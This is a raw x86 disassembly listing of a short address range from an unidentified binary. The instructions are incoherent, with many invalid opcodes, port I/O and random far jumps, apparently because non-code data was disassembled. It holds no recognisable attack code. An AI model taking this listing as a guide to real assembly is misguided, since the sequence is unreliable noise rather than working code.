  41b9fe:	sbb    al,0x4d
  41ba00:	inc    esp
  41ba01:	cmc    
  41ba02:	(bad)  [edx-0x6b339210]
  41ba08:	push   ss
  41ba09:	inc    eax
  41ba0a:	inc    eax
  41ba0b:	and    eax,0x78af981d
  41ba10:	inc    esi
  41ba11:	cmp    eax,0x318057c4
  41ba16:	mov    eax,ds:0x30c167b1
  41ba1b:	inc    edi
  41ba1c:	out    0x2d,eax
  41ba1e:	add    DWORD PTR [eax-0x1a],esp
  41ba21:	dec    eax
  41ba22:	in     eax,0xaf
  41ba24:	stos   BYTE PTR es:[edi],al
  41ba25:	xlat   BYTE PTR ds:[ebx]
  41ba26:	popa   
  41ba27:	sti    
  41ba28:	xchg   edi,eax
  41ba29:	pop    ds
  41ba2a:	sbb    DWORD PTR [edi+eiz*4-0x2c11c60e],ebx
  41ba31:	jbe    0x41b9d8
  41ba33:	enter  0xa4a6,0x82
  41ba37:	sub    BYTE PTR [edi],dl
  41ba39:	pop    edx
  41ba3a:	lahf   
  41ba3b:	cli    
  41ba3c:	mov    ah,0xa4
  41ba3e:	jmp    0x41b9fb
  41ba40:	dec    edi
  41ba41:	lods   al,BYTE PTR ds:[esi]
  41ba42:	mul    DWORD PTR [esi-0x1a84052a]
  41ba48:	or     dh,al
  41ba4a:	daa    
  41ba4b:	int    0x40
  41ba4d:	hlt    
  41ba4e:	ja     0x41ba93
  41ba50:	push   ss
  41ba51:	mov    ds:0x9211eaf9,al
  41ba56:	add    eax,0xa62ef2c0
  41ba5b:	repnz and DWORD PTR [edx+ebp*8+0x33],edi
  41ba60:	cmp    al,0xb6
  41ba62:	mov    ch,0xdd
  41ba64:	or     DWORD PTR [ecx],ebp
  41ba66:	loope  0x41ba02
  41ba68:	jg     0x41ba18
  41ba6a:	mov    dl,0x53
  41ba6c:	mov    edi,0x6003cb28
  41ba71:	sub    eax,0xfcc5524f
  41ba76:	add    al,BYTE PTR [edx-0x4f23a712]
  41ba7c:	add    al,0xaa
  41ba7e:	cdq    
  41ba7f:	push   edx
  41ba80:	arpl   WORD PTR [edi+0x79],si
  41ba83:	jae    0x41ba1d
  41ba85:	mov    WORD PTR [esi],ds
  41ba87:	adc    al,0xb1
  41ba89:	ret    
  41ba8a:	adc    al,bh
  41ba8c:	xchg   edi,eax
  41ba8d:	inc    esp
  41ba8e:	jmp    0x41ba87
  41ba90:	mov    cl,0xd
  41ba92:	push   es
  41ba93:	imul   ebp,DWORD PTR [eax],0xfffffffc
  41ba96:	out    dx,eax
  41ba97:	inc    ecx
  41ba98:	(bad)  
  41ba9a:	mov    esi,?
  41ba9c:	out    dx,al
  41ba9d:	enter  0x4b47,0x78
  41baa1:	cmp    bl,al
  41baa3:	(bad)  
  41baa4:	into   
  41baa5:	xchg   esp,eax
  41baa6:	mov    dh,0x8d
  41baa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa9:	cmc    
  41baaa:	stc    
  41baab:	push   esi
  41baac:	adc    BYTE PTR [edi-0x7a],cl
  41baaf:	mov    eax,0xe2a5a7eb
  41bab4:	sbb    BYTE PTR [eax],cl
  41bab6:	test   al,0x90
  41bab8:	or     BYTE PTR [ecx-0x2d005b2],dl
  41babe:	xlat   BYTE PTR ds:[ebx]
  41babf:	sub    ebp,DWORD PTR [ecx]
  41bac1:	xchg   esp,eax
  41bac2:	mov    fs,WORD PTR [esi+eiz*1+0x51]
  41bac6:	test   BYTE PTR [edx],cl
  41bac8:	fidiv  DWORD PTR [ebp+0x62]
  41bacb:	or     ah,BYTE PTR [edi]
  41bacd:	lds    ebp,FWORD PTR [edi+0x76]
  41bad0:	and    al,0x9a
  41bad2:	cdq    
  41bad3:	(bad)  
  41bad4:	loopne 0x41bb02
  41bad6:	mov    bh,0x6e
  41bad8:	retf   
  41bad9:	pop    ecx
  41bada:	jl     0x41ba6b
  41badc:	or     DWORD PTR [ebx-0x79ee33f1],edx
  41bae2:	jne    0x41bb5f
  41bae4:	mov    esp,0x7cfc8221
  41bae9:	mov    dl,dh
  41baeb:	repnz mov bl,dl
  41baee:	push   es
  41baef:	nop
  41baf0:	shl    BYTE PTR [eax+ebp*2],0xf9
  41baf4:	fimul  WORD PTR [edi+0x12dd2125]
  41bafa:	jo     0x41bb2f
  41bafc:	push   edi
  41bafd:	lahf   
  41bafe:	push   edx
  41baff:	aaa    
  41bb00:	xor    ah,ch
  41bb02:	mov    esi,DWORD PTR [ebx+0x7a64f8fe]
  41bb08:	dec    esi
  41bb09:	cmp    ah,BYTE PTR [ebx-0x3f29f090]
  41bb0f:	neg    DWORD PTR [esi+0x319add71]
  41bb15:	xor    eax,0x8aaca046
  41bb1a:	sbb    al,0x99
  41bb1c:	clc    
  41bb1d:	daa    
  41bb1e:	and    DWORD PTR [eax-0x66],eax
  41bb21:	xchg   ebp,eax
  41bb22:	ins    DWORD PTR es:[edi],dx
  41bb23:	adc    eax,0xf4a3c031
  41bb28:	aas    
  41bb29:	jb     0x41bb03
  41bb2b:	scas   eax,DWORD PTR es:[edi]
  41bb2c:	dec    eax
  41bb2d:	test   eax,0x5eaa01c1
  41bb32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb33:	and    DWORD PTR [ebx-0x4c9961fe],ecx
  41bb39:	mov    WORD PTR [eax+0x60],fs
  41bb3c:	daa    
  41bb3d:	call   0x1c8fd80
  41bb42:	outs   dx,DWORD PTR ds:[esi]
  41bb43:	push   0x9c3a0cbb
  41bb48:	xchg   edi,eax
  41bb49:	(bad)  
  41bb4a:	test   eax,0xc5d4422a
  41bb4f:	dec    ebx
  41bb50:	and    esi,DWORD PTR [ebx-0x39237eae]
  41bb56:	ret    0x690d
  41bb59:	and    ebx,DWORD PTR [eax]
  41bb5b:	shl    BYTE PTR [edx+0x4a],0x6
  41bb5f:	gs adc esi,ebx
  41bb62:	and    bh,0xb
  41bb65:	lods   eax,DWORD PTR ds:[esi]
  41bb66:	cmp    esi,DWORD PTR [edx-0x54bed201]
  41bb6c:	into   
  41bb6d:	pop    es
  41bb6e:	jmp    0x76b3:0x6cdabbc3
  41bb75:	cmp    BYTE PTR [esi-0x31],ch
  41bb78:	repz (bad) 
  41bb7a:	xchg   edx,eax
  41bb7b:	mov    ah,0x7c
  41bb7d:	lods   al,BYTE PTR ds:[esi]
  41bb7e:	je     0x41bba6
  41bb80:	sub    ebx,edi
  41bb82:	xor    al,bl
  41bb84:	jne    0x41bbad
  41bb86:	ud1    esp,DWORD PTR [edi]
  41bb89:	iret   
  41bb8a:	jle    0x41bc09
  41bb8c:	test   edi,edi
  41bb8e:	stos   BYTE PTR es:[edi],al
  41bb8f:	sbb    DWORD PTR [eax],0xffffffb4
  41bb92:	dec    esp
  41bb93:	inc    eax
  41bb94:	(bad)  
  41bb95:	pushf  
  41bb96:	lds    ecx,FWORD PTR [ebx+0x36]
  41bb99:	iret   
  41bb9a:	mov    ds:0x5ebe01c5,eax
  41bba0:	jmp    0x691a76ec
  41bba5:	mov    ch,0xd7
  41bba7:	enter  0x36d1,0xe
  41bbab:	or     eax,0xc11f4cc0
  41bbb0:	push   ebp
  41bbb1:	sbb    ebx,DWORD PTR [esi+0x14]
  41bbb4:	call   0xc998:0x9dd465b1
  41bbbb:	mov    esi,0x36df059d
  41bbc0:	fst    QWORD PTR [edi+0x7914b79e]
  41bbc6:	inc    ebp
  41bbc7:	test   ecx,edx
  41bbc9:	add    dl,BYTE PTR [esi]
  41bbcb:	stos   DWORD PTR es:[edi],eax
  41bbcc:	xchg   ecx,eax
  41bbcd:	aas    
  41bbce:	push   esp
  41bbcf:	shr    esi,1
  41bbd1:	sub    ah,cl
  41bbd3:	adc    DWORD PTR [ebx+edx*8+0x6c93fffa],edi
  41bbda:	into   
  41bbdb:	xor    BYTE PTR [esi],0x4a
  41bbde:	repz sbb bl,0x2f
  41bbe2:	xor    cl,ch
  41bbe4:	push   edi
  41bbe5:	sub    DWORD PTR [ebp-0x5aba7b35],edi
  41bbeb:	jecxz  0x41bc5c
  41bbed:	clc    
  41bbee:	sbb    eax,DWORD PTR [esi-0xf]
  41bbf1:	loopne 0x41bc10
  41bbf3:	fstp   TBYTE PTR [edi+0x55]
  41bbf6:	adc    al,0xcf
  41bbf8:	adc    eax,0x44858cac
  41bbfd:	xchg   DWORD PTR [ebx],esi
  41bbff:	or     al,0x80
  41bc01:	inc    edi
  41bc02:	retf   
  41bc03:	mov    DWORD PTR [ebx],esp
  41bc05:	(bad)  
  41bc06:	cli    
  41bc07:	mov    cl,BYTE PTR ds:0xc9c9329f
  41bc0d:	jmp    0x41bc05
  41bc0f:	mov    ebx,0xfdb77406
  41bc14:	jae    0x41bc12
  41bc16:	cwde   
  41bc17:	pop    es
  41bc18:	pop    edi
  41bc19:	aad    0x87
  41bc1b:	dec    eax
  41bc1c:	clc    
  41bc1d:	or     BYTE PTR ds:0xb9f8110d,al
  41bc23:	rcl    BYTE PTR [ecx],1
  41bc25:	dec    edi
  41bc26:	add    DWORD PTR [eax+eiz*1+0x50954dc4],ecx
  41bc2d:	lods   eax,DWORD PTR ds:[esi]
  41bc2e:	test   eax,0x36783ae5
  41bc33:	ds das 
  41bc35:	mov    dh,0x53
  41bc37:	jmp    0x41bc52
  41bc39:	sub    ch,BYTE PTR [esi+0x63fcc240]
  41bc3f:	popf   
  41bc40:	mov    ebx,0xcd71680b
  41bc45:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc47:	and    eax,DWORD PTR [esi+0x1d]
  41bc4a:	add    BYTE PTR [edi-0x5c],0x4d
  41bc4e:	cmp    cl,bh
  41bc50:	or     BYTE PTR [ecx],ah
  41bc52:	fmul   st,st(6)
  41bc54:	mov    ds:0xcc1edafb,al
  41bc59:	(bad)  
  41bc5b:	(bad)  
  41bc5d:	push   eax
  41bc5e:	adc    al,BYTE PTR [ebp-0x22]
  41bc61:	adc    eax,0xa1a42e9b
  41bc66:	int3   
  41bc67:	mov    dl,0xa8
  41bc69:	inc    eax
  41bc6a:	adc    al,0xf6
  41bc6c:	jge    0x41bc7f
  41bc6e:	scas   al,BYTE PTR es:[edi]
  41bc6f:	jne    0x41bc9a
  41bc71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc72:	out    dx,al
  41bc73:	cli    
  41bc74:	out    0x4e,al
  41bc76:	xor    ch,ah
  41bc78:	fild   QWORD PTR [esi-0x2e]
  41bc7b:	je     0x41bcea
  41bc7d:	ss scas eax,DWORD PTR es:[edi]
  41bc7f:	inc    esp
  41bc80:	fstp   st(1)
  41bc82:	loope  0x41bc0f
  41bc84:	rcr    BYTE PTR [eax+0x4e55000],cl
  41bc8a:	scas   al,BYTE PTR es:[edi]
  41bc8b:	and    esp,DWORD PTR ds:0x8be97271
  41bc91:	cmp    al,0x6b
  41bc93:	push   cs
  41bc94:	aad    0x31
  41bc96:	popf   
  41bc97:	lods   eax,DWORD PTR ds:[esi]
  41bc98:	or     ah,BYTE PTR [edx+0x3c]
  41bc9b:	adc    BYTE PTR [ebx+0x42fa9144],ch
  41bca1:	dec    esp
  41bca2:	mov    esp,edi
  41bca4:	push   edx
  41bca5:	outs   dx,BYTE PTR ds:[esi]
  41bca6:	out    dx,al
  41bca7:	call   0xd904cc55
  41bcac:	(bad)  
  41bcad:	xor    DWORD PTR [ecx-0x12],esi
  41bcb0:	or     DWORD PTR [edi+0xf],ecx
  41bcb3:	scas   eax,DWORD PTR es:[edi]
  41bcb4:	xor    DWORD PTR [edx+0x4b],edx
  41bcb7:	push   esp
  41bcb8:	jmp    0x9e006c7
  41bcbd:	xchg   ecx,eax
  41bcbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcbf:	pmullw mm4,mm7
  41bcc2:	jno    0x41bc8d
  41bcc4:	sbb    al,0x48
  41bcc6:	mov    al,ds:0x3de741b4
  41bccb:	inc    ebx
  41bccc:	cmc    
  41bccd:	mov    al,ds:0xe6ec9c8b
  41bcd2:	out    dx,eax
  41bcd3:	dec    ebx
  41bcd4:	xchg   ebx,eax
  41bcd5:	pop    esp
  41bcd6:	jbe    0x41bcaa
  41bcd8:	mov    esi,0x22916073
  41bcdd:	sbb    eax,0x9b62c637
  41bce2:	ret    
  41bce3:	add    dl,BYTE PTR [edi-0x23]
  41bce6:	dec    ebx
  41bce7:	push   ebp
  41bce8:	and    al,0x37
  41bcea:	or     BYTE PTR [ebx+ebp*4],ah
  41bced:	add    eax,0x10bfb48c
  41bcf2:	sub    DWORD PTR [edx+ebp*4+0xc],0xffffffef
  41bcf7:	outs   dx,DWORD PTR ds:[esi]
  41bcf8:	jecxz  0x41bc85
  41bcfa:	dec    di
  41bcfc:	sbb    eax,0x126a0538
  41bd01:	jne    0x41bcd9
  41bd03:	mov    dl,0x36
  41bd05:	jbe    0x41bcfc
  41bd07:	dec    dh
  41bd09:	ret    
  41bd0a:	jle    0x41bd57
  41bd0c:	xor    esp,eax
  41bd0e:	(bad)  
  41bd0f:	xchg   DWORD PTR ds:0x4499cd3c,ecx
  41bd15:	ficom  WORD PTR [ebp-0x1854082a]
  41bd1b:	and    eax,0x4dca0872
  41bd20:	test   eax,0x3f965ef
  41bd25:	or     dl,BYTE PTR [eax+0x2]
  41bd28:	pop    ebx
  41bd29:	fstp   QWORD PTR [edx+0x43]
  41bd2c:	cwde   
  41bd2d:	push   ebp
  41bd2e:	push   ss
  41bd2f:	mov    esi,0xf5377d66
  41bd34:	es xor eax,0xae6e4bb9
  41bd3a:	pop    ds
  41bd3b:	out    dx,al
  41bd3c:	cmp    cl,ah
  41bd3e:	gs inc edi
  41bd40:	xchg   ecx,eax
  41bd41:	lea    ecx,ds:0x3ab3e1d2
  41bd47:	push   esp
  41bd48:	push   es
  41bd49:	push   ebx
  41bd4a:	pop    ecx
  41bd4b:	fidiv  DWORD PTR [ebp+0x4acd9a09]
  41bd51:	sbb    edi,DWORD PTR [ecx]
  41bd53:	mov    edi,0x9e447822
  41bd58:	push   ecx
  41bd59:	sub    dh,BYTE PTR [esi]
  41bd5b:	cmc    
  41bd5c:	ins    DWORD PTR es:[di],dx
  41bd5e:	xchg   edx,eax
  41bd5f:	cld    
  41bd60:	pop    es
  41bd61:	mov    cl,0xe
  41bd63:	sahf   
  41bd64:	inc    ecx
  41bd65:	inc    ebp
  41bd66:	push   edi
  41bd67:	push   ds
  41bd68:	fwait
  41bd69:	iret   
  41bd6a:	mov    ecx,0xa9c5de3f
  41bd6f:	push   edi
  41bd70:	aaa    
  41bd71:	jecxz  0x41bd44
  41bd73:	leave  
  41bd74:	dec    ebp
  41bd75:	add    al,BYTE PTR [bp+si-0x5]
  41bd79:	sub    al,0x35
  41bd7b:	jo     0x41bd0f
  41bd7d:	stos   DWORD PTR es:[edi],eax
  41bd7e:	imul   ebx,ebx,0xb4561fef
  41bd84:	ret    
  41bd85:	and    DWORD PTR [edi-0x349616b6],ecx
  41bd8b:	inc    esi
  41bd8c:	push   ss
  41bd8d:	push   ds
  41bd8e:	mov    bl,0xfa
  41bd90:	int3   
  41bd91:	adc    esi,0x1c2a8ae6
  41bd97:	cmp    al,0x8
  41bd99:	jo     0x41be03
  41bd9b:	mov    edi,DWORD PTR [eax-0x4d]
  41bd9e:	imul   ecx,DWORD PTR [esi],0x13b75b6e
  41bda4:	adc    eax,0xc56023b
  41bda9:	loop   0x41bda7
  41bdab:	mov    ch,0x8b
  41bdad:	jge    0x41bd83
  41bdaf:	ja     0x41bdc7
  41bdb1:	mov    al,BYTE PTR [ebp-0x4f0bab20]
  41bdb7:	inc    edi
  41bdb8:	jae    0x41bde2
  41bdba:	pop    eax
  41bdbb:	cmp    DWORD PTR [ebx-0x7fe162ad],eax
  41bdc1:	out    0x6c,eax
  41bdc3:	and    BYTE PTR ds:0xed3eb790,ah
  41bdc9:	inc    ecx
  41bdca:	cmp    eax,ebx
  41bdcc:	xor    eax,0xa6668384
  41bdd1:	dec    ebx
  41bdd2:	add    ch,BYTE PTR [eax-0x2d]
  41bdd5:	into   
  41bdd6:	mov    bl,0xee
  41bdd8:	(bad)  
  41bdd9:	iret   
  41bdda:	icebp  
  41bddb:	cmp    esp,DWORD PTR [edx]
  41bddd:	sti    
  41bdde:	push   ds
  41bddf:	jne    0x41bd9b
  41bde1:	enter  0x15a1,0x5a
  41bde5:	outs   dx,BYTE PTR ds:[esi]
  41bde6:	repz jl 0x41bd78
  41bde9:	jmp    DWORD PTR [eax-0x75996c15]
  41bdef:	jg     0x41be56
  41bdf1:	push   0x97b7b807
  41bdf6:	loope  0x41bdbc
  41bdf8:	hlt    
  41bdf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdfa:	push   cs
  41bdfb:	out    0xa3,al
  41bdfd:	push   es
  41bdfe:	rcr    DWORD PTR [ecx],0xde
  41be01:	xchg   edx,eax
  41be02:	daa    
  41be03:	das    
  41be04:	xor    DWORD PTR [esi+0x7604b3ee],ebx
  41be0a:	pop    ss
  41be0b:	jne    0x41be23
  41be0d:	mov    ebx,esi
  41be0f:	adc    ebx,esp
  41be11:	pop    ecx
  41be12:	fs jns 0x41bdf3
  41be15:	lea    esp,[edx]
  41be17:	int3   
  41be18:	sbb    bh,0xa8
  41be1b:	ret    0xc5ad
  41be1e:	adc    BYTE PTR ds:0xa8551918,bl
  41be24:	clc    
  41be25:	xchg   ebx,eax
  41be26:	and    ah,BYTE PTR [ebp-0x78]
  41be29:	scas   al,BYTE PTR es:[edi]
  41be2a:	jle    0x41be7e
  41be2c:	mov    edi,0x73058f64
  41be31:	pop    edx
  41be32:	loop   0x41be43
  41be34:	or     ecx,edi
  41be36:	bound  ebx,QWORD PTR [ecx]
  41be38:	fs in  eax,0xf2
  41be3b:	fistp  DWORD PTR [esi]
  41be3d:	push   esi
  41be3e:	ret    
  41be3f:	mov    edi,0xab91d69
  41be44:	dec    edi
  41be45:	jle    0x41bdfd
  41be47:	pop    ebx
  41be48:	and    eax,0x2b23d26f
  41be4d:	adc    eax,0x924b59ab
  41be52:	jne    0x41be3e
  41be54:	fdivr  QWORD PTR [ebx-0x59]
  41be57:	or     BYTE PTR [ebp+0x6b6be0a5],dl
  41be5d:	and    dh,BYTE PTR [ebp+ebp*4-0x6a5aa101]
  41be64:	jno    0x41be2e
  41be66:	and    esp,esi
  41be68:	jp     0x41be4c
  41be6a:	xchg   ecx,eax
  41be6b:	outs   dx,DWORD PTR ds:[esi]
  41be6c:	shr    BYTE PTR [esi+0x76],cl
  41be6f:	maskmovq mm7,(bad)
  41be70:	idiv   DWORD PTR [esi+edx*8-0x3a]
  41be74:	push   es
  41be75:	and    al,0x8b
  41be77:	js     0x41be3e
  41be79:	sub    BYTE PTR [eax+edx*4],bh
  41be7c:	cli    
  41be7d:	aad    0xaa
  41be7f:	shr    DWORD PTR ds:0xd302dc57,0xa8
  41be86:	push   esp
  41be87:	inc    esp
  41be88:	shl    BYTE PTR [edi],cl
  41be8a:	test   al,0xa8
  41be8c:	adc    esi,ebp
  41be8e:	(bad)  
  41be8f:	call   0x5788:0xdac1c98f
  41be96:	popa   
  41be97:	cmp    edi,ecx
  41be99:	cmp    dh,ah
  41be9b:	repz xor al,0xb8
  41be9e:	mov    bl,BYTE PTR [eax+0x71]
  41bea1:	sub    cl,dl
  41bea3:	ss jg  0x41beb3
  41bea6:	out    0x85,eax
  41bea8:	add    al,0x87
  41beaa:	jmp    0x41be66
  41beac:	push   ecx
  41bead:	sbb    eax,0xc55ae2e
  41beb2:	push   ecx
  41beb3:	sub    esp,DWORD PTR [esi-0x12]
  41beb6:	inc    ebp
  41beb7:	test   DWORD PTR ds:0x1a287612,0x41093193
  41bec1:	inc    edi
  41bec2:	xchg   ecx,eax
  41bec3:	add    ebp,esp
  41bec5:	test   BYTE PTR [ecx-0x48],al
  41bec8:	add    DWORD PTR [ebp+0x6a],edx
  41becb:	loop   0x41bf41
  41becd:	out    dx,al
  41bece:	js     0x41be9f
  41bed0:	(bad)  
  41bed1:	jmp    0x41be8a
  41bed3:	scas   al,BYTE PTR es:[edi]
  41bed4:	push   ebx
  41bed5:	jl     0x41bf53
  41bed7:	xchg   esi,eax
  41bed8:	mov    esi,0xf053cfe1
  41bedd:	dec    ecx
  41bede:	push   edx
  41bedf:	xchg   edi,eax
  41bee0:	das    
  41bee1:	dec    esi
  41bee2:	inc    edi
  41bee3:	pop    es
  41bee4:	enter  0x5a08,0xed
  41bee8:	dec    ecx
  41bee9:	shl    BYTE PTR [ebx-0x6f96922d],1
  41beef:	call   0xed995563
  41bef4:	stc    
  41bef5:	cmp    ecx,ebp
  41bef7:	leave  
  41bef8:	jmp    0x41bf2f
  41befa:	daa    
  41befb:	cs nop
  41befd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41befe:	sahf   
  41beff:	jecxz  0x41bf76
  41bf01:	loope  0x41be88
  41bf03:	mov    eax,0x77649a8f
  41bf08:	mov    ch,0xb7
  41bf0a:	push   ebx
  41bf0c:	sub    esi,ecx
  41bf0e:	ss cmp eax,0x1c55b31e
  41bf14:	out    0x22,al
  41bf16:	sub    eax,0x5fae4550
  41bf1b:	out    dx,al
  41bf1c:	push   ebp
  41bf1d:	push   esp
  41bf1e:	pop    edi
  41bf1f:	loope  0x41bf4a
  41bf21:	xor    al,0x74
  41bf23:	gs iret 
  41bf25:	mov    eax,ds:0xda73b39c
  41bf2a:	add    al,0x11
  41bf2c:	mov    bh,0x56
  41bf2e:	in     eax,0x98
  41bf30:	or     ebp,eax
  41bf32:	(bad)  
  41bf33:	not    BYTE PTR [edx]
  41bf35:	das    
  41bf36:	retf   
  41bf37:	scas   eax,DWORD PTR es:[edi]
  41bf38:	cdq    
  41bf39:	mov    cs:0x969a8756,eax
  41bf3f:	cs mov dh,0x98
  41bf42:	outs   dx,BYTE PTR ds:[esi]
  41bf43:	pop    esi
  41bf44:	adc    cl,BYTE PTR [edi]
  41bf46:	pop    edx
  41bf47:	inc    esp
  41bf48:	jge    0x41bf96
  41bf4a:	loopne 0x41bee0
  41bf4c:	sub    bh,0x78
  41bf4f:	dec    esi
  41bf50:	push   ebx
  41bf51:	xor    dh,bh
  41bf53:	push   esp
  41bf54:	sti    
  41bf55:	in     eax,0x95
  41bf57:	ficomp DWORD PTR [eax]
  41bf59:	adc    BYTE PTR [esi],dl
  41bf5b:	out    dx,eax
  41bf5c:	pop    ecx
  41bf5d:	in     eax,0x82
  41bf5f:	jecxz  0x41bf31
  41bf61:	inc    edx
  41bf62:	pop    esi
  41bf63:	sub    DWORD PTR gs:[edi],ebp
  41bf66:	fwait
  41bf67:	xchg   DWORD PTR [esi-0x15f4b5e3],edi
  41bf6d:	push   edi
  41bf6e:	lahf   
  41bf6f:	lods   al,BYTE PTR ds:[esi]
  41bf70:	adc    al,BYTE PTR [ecx+0x30]
  41bf73:	inc    ebx
  41bf74:	into   
  41bf75:	sbb    BYTE PTR [edi-0x18],bh
  41bf78:	push   ecx
  41bf79:	in     al,dx
  41bf7a:	sar    esi,0x69
  41bf7d:	xor    ebx,DWORD PTR [edx-0x36bc6c]
  41bf83:	mov    esp,0xf0af984d
  41bf88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf89:	idiv   BYTE PTR [edx]
  41bf8b:	push   ss
  41bf8c:	nop
  41bf8d:	repz int3 
  41bf8f:	inc    esp
  41bf90:	xchg   DWORD PTR [ecx],ebp
  41bf92:	mov    ecx,0xae671c5a
  41bf97:	je     0x41bf86
  41bf99:	cmc    
  41bf9a:	jmp    0x142c:0x341f10ae
  41bfa1:	xor    al,BYTE PTR [eax+0x79]
  41bfa4:	imul   ecx,DWORD PTR [ebp-0x2f51db4c],0xffffffc9
  41bfab:	(bad)  
  41bfac:	scas   ax,WORD PTR es:[edi]
  41bfae:	sbb    ebx,DWORD PTR [ebp-0x62]
  41bfb1:	int    0x66
  41bfb3:	fcom   st(7)
  41bfb5:	je     0x41c024
  41bfb7:	in     eax,0xee
  41bfb9:	imul   esi,DWORD PTR [esi+0x17172870],0x4b1001a3
  41bfc3:	fbstp  TBYTE PTR [edx-0x4]
  41bfc6:	stos   DWORD PTR es:[edi],eax
  41bfc7:	pusha  
  41bfc8:	mov    WORD PTR [edi+edx*8+0x2e],gs
  41bfcc:	fst    QWORD PTR [ebx+0x2]
  41bfcf:	push   ss
  41bfd0:	mov    bl,0x14
  41bfd2:	scas   al,BYTE PTR es:[edi]
  41bfd3:	jae    0x41bf8a
  41bfd5:	pop    ds
  41bfd6:	out    0x3,al
  41bfd8:	mov    ds:0xbd456a2f,al
  41bfdd:	mov    ch,0x6a
  41bfdf:	mul    BYTE PTR [ecx+0x153dd2dc]
  41bfe5:	mov    al,0x89
  41bfe7:	ja     0x41c007
  41bfe9:	mov    DWORD PTR [edi-0x140d3922],ecx
  41bfef:	push   esp
  41bff0:	xchg   BYTE PTR ds:0x52a22147,ch
  41bff6:	mov    esi,es
  41bff8:	cmp    DWORD PTR [esi],eax
  41bffa:	push   edx
  41bffb:	mov    ah,0xd
  41bffd:	mov    ch,0x92
  41bfff:	jno    0x41c006
  41c001:	pop    eax
  41c002:	mov    WORD PTR [edx+0x2],?
  41c005:	mov    edx,ebx
  41c007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c008:	dec    ebp
  41c009:	aaa    
  41c00a:	pusha  
  41c00b:	mov    BYTE PTR [ebx],dl
  41c00d:	pop    DWORD PTR [eax+0x57]
  41c010:	jmp    0x41c02b
  41c012:	ficomp WORD PTR [edi]
  41c014:	adc    eax,0x3a76906a
  41c019:	lds    esi,FWORD PTR [eax-0x1f]
  41c01c:	(bad)  
  41c01d:	dec    ebx
  41c01e:	push   es
  41c01f:	mov    edx,DWORD PTR [eax]
  41c021:	push   es
  41c022:	mov    cl,0x3a
  41c024:	sbb    bh,cl
  41c026:	mov    BYTE PTR ds:0x5daf4,bh
  41c02c:	icebp  
  41c02d:	push   esp
  41c02e:	ins    DWORD PTR es:[edi],dx
  41c02f:	(bad)  
  41c031:	xchg   ebp,eax
  41c032:	push   ss
  41c033:	cwde   
  41c034:	push   0x78
  41c036:	ss mov ecx,0xee11e364
  41c03c:	hlt    
  41c03d:	pop    ss
  41c03e:	cmp    bh,0xd2
  41c041:	loop   0x41c003
  41c043:	adc    cl,BYTE PTR ds:0xc85c34e
  41c049:	outs   dx,BYTE PTR ds:[esi]
  41c04a:	stos   BYTE PTR es:[edi],al
  41c04b:	cmp    ch,0x38
  41c04e:	push   esi
  41c04f:	jecxz  0x41c0ad
  41c051:	pushf  
  41c052:	lock rcl BYTE PTR [edi],cl
  41c055:	std    
  41c056:	out    0x40,eax
  41c058:	push   ss
  41c059:	test   DWORD PTR [ebx],edx
  41c05b:	call   edi
  41c05d:	fwait
  41c05e:	adc    eax,0x2b9e38ce
  41c063:	test   BYTE PTR [edx+0x8],ah
  41c066:	sub    ebp,esi
  41c068:	adc    BYTE PTR [esp+edx*2-0x63],ch
  41c06c:	inc    ecx
  41c06d:	xchg   BYTE PTR [ebp+0x54],bh
  41c070:	es xchg ecx,eax
  41c072:	push   ecx
  41c073:	dec    edx
  41c074:	add    dl,al
  41c076:	retf   0x3020
  41c079:	nop
  41c07a:	jne    0x41c09b
  41c07c:	add    al,0x70
  41c07e:	dec    ecx
  41c07f:	stos   DWORD PTR es:[edi],eax
  41c080:	pop    esp
  41c081:	div    DWORD PTR [edx+0x41]
  41c084:	jl     0x41c0af
  41c086:	inc    edi
  41c087:	fst    QWORD PTR [edx]
  41c089:	(bad)  
  41c08a:	pop    edx
  41c08b:	add    esi,DWORD PTR [eax]
  41c08d:	lock test eax,0x1dc7d053
  41c093:	in     eax,dx
  41c094:	lock arpl WORD PTR [edx-0x6a0bf20f],bx
  41c09b:	or     al,BYTE PTR [eax]
  41c09d:	or     eax,0xa736717a
  41c0a2:	adc    al,0xe1
  41c0a4:	cmp    eax,DWORD PTR [edx+0x64c6ba89]
  41c0aa:	cmc    
  41c0ab:	push   0x2172bf5f
  41c0b0:	dec    edx
  41c0b1:	push   es
  41c0b2:	in     al,0xf8
  41c0b4:	add    ah,BYTE PTR [ebp-0x772b8d5e]
  41c0ba:	sub    ah,bh
  41c0bc:	call   0xb7eb53d1
  41c0c1:	push   cs
  41c0c2:	(bad)  [ebx-0x6e623c37]
  41c0c8:	pusha  
  41c0c9:	mov    ds:0x8876ab78,eax
  41c0ce:	add    eax,0x10853007
  41c0d3:	out    dx,al
  41c0d4:	repz dec edi
  41c0d6:	stos   BYTE PTR es:[edi],al
  41c0d7:	aam    0x44
  41c0d9:	enter  0x5b44,0x8b
  41c0dd:	cmp    BYTE PTR [ebp+0x620ccd19],bl
  41c0e3:	leave  
  41c0e4:	push   cs
  41c0e5:	push   ss
  41c0e6:	(bad)  
  41c0e7:	out    dx,al
  41c0e8:	xchg   esp,eax
  41c0e9:	ficomp DWORD PTR [ebx+0x13b6cdad]
  41c0ef:	js     0x41c0c0
  41c0f1:	div    DWORD PTR [edi-0x485ea381]
  41c0f7:	sbb    BYTE PTR [ebx+0x7af5a5e5],bl
  41c0fd:	imul   ebx,edi,0x853c5be
  41c103:	in     al,0xce
  41c105:	jl     0x41c0a9
  41c107:	inc    ebx
  41c108:	push   ebx
  41c109:	sti    
  41c10a:	shl    BYTE PTR [ebp-0xf],1
  41c10d:	adc    eax,0x5c1c005e
  41c112:	dec    esi
  41c113:	fst    QWORD PTR [edi+0x6bec582f]
  41c119:	mov    ds:0x308e740a,al
  41c11e:	cmp    dh,BYTE PTR [ecx+0x4070662]
  41c124:	ret    0x2cad
  41c127:	inc    edx
  41c128:	repz lea eax,[ebx+ecx*8]
  41c12c:	aaa    
  41c12d:	mov    DWORD PTR [edx+0xd0adeaf],ebx
  41c133:	pop    esp
